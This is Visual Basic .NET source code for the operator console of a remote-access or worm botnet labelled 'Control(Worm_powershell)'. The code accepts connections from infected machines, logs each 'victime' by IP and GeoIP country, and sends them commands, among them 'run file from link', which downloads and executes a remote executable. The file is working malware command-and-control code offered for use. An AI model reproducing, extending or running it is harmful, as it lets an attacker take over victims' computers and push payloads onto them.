Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing
Public Class Form1
    Inherits Form
    Public WithEvents S As New SocketServer
    Public Yy As String = "<>"
    Public downme As String
    Public sock As Integer
    Public GetCountry As GeoIP
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Public port As Integer = 808
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
       
        Try
            Dim str3 As String = Interaction.InputBox("Port", "Default Port", port)
            If (str3.Length = 0) Then
                End
            End If
            port = Conversions.ToInteger(str3)
            Control.CheckForIllegalCrossThreadCalls = False
            S.Start(port)
            GetCountry = New GeoIP((Application.StartupPath & "\GeoIP.dat"))
            NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            NotifyIcon1.BalloonTipTitle = "Control(Worm_powershell)"
            NotifyIcon1.BalloonTipText = "[Welcome to Control(Worm_powershell) ]"
            NotifyIcon1.ShowBalloonTip(1)

        Catch exception1 As Exception

        End Try
    End Sub

#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Me.Text = "Control(Worm_powershell) -  ,Onlines{x}".Replace("x", S.Online.Count)
        Try
            L1.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try
    End Sub
    Sub Connected(ByVal sock As Integer) Handles S.Connected
        Me.Text = "Control(Worm_powershell) - ,Onlines{x}".Replace("x", S.Online.Count)
        S.Send(sock, "PC" & Yy)
    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, Yy)
        
        Try
            Select Case A(0)
                Case "PC"

                    Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(GetCountry.LookupCountryName(S.IP(sock)))))
                    L.SubItems.Add(S.IP(sock))
                    L.SubItems.Add(A(2))
                    L.SubItems.Add(A(3))
                    L.SubItems.Add(A(4))
                    L.SubItems.Add(A(5))
                    L.SubItems.Add(A(6))
                    L.ToolTipText = sock
                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "Control(Worm_powershell)"
                    NotifyIcon1.BalloonTipText = "New Victime : " & A(1) & vbCrLf & " IP : " & S.IP(sock) & vbCrLf & "Country : " & _
                    GetCountry.LookupCountryName(S.IP(sock))
                    ' Beep()
                    NotifyIcon1.ShowBalloonTip(1)

                
                
                
                

                

            End Select
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
#End Region



  
    Private Sub OpenUrlToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenUrlToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim k As String = InputBox("Open url", "URL", "www.dev-point.com")
            If k = "" Then Exit Sub
            S.Send(x.ToolTipText, "url" & Yy & k & Yy)
        Next
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisconnectToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "dis" & Yy)
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "cl" & Yy)
        Next
    End Sub

    Private Sub RunFileFromLinkToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunFileFromLinkToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim k As String = InputBox("Run file from link", "link", "http://127.0.0.1/server.exe")
            Dim f As String = InputBox("Run file from link", "File Name", "mr3amo.exe")
            If k = "" Then Exit Sub
            If f = "" Then Exit Sub
            S.Send(x.ToolTipText, "Dow" & Yy & k & Yy & f & Yy)
        Next
    End Sub

    

    Public Function SetBytes(ByVal Bytes) As String
        On Error GoTo hell
        If Bytes >= 1073741824 Then
            Return Format(Bytes / 1024 / 1024 / 1024, "#0.00") & " Gb"
        ElseIf Bytes >= 1048576 Then
            Return Format(Bytes / 1024 / 1024, "#0.00") & " Mb"
        ElseIf Bytes >= 1024 Then
            Return Format(Bytes / 1024, "#0.00") & " Kb"
        ElseIf Bytes < 1024 Then
            Return Fix(Bytes) & " Bytes"
        End If
        ' Exit Function
hell:
        Return ""
    End Function


    
    
    

   
   
End Class
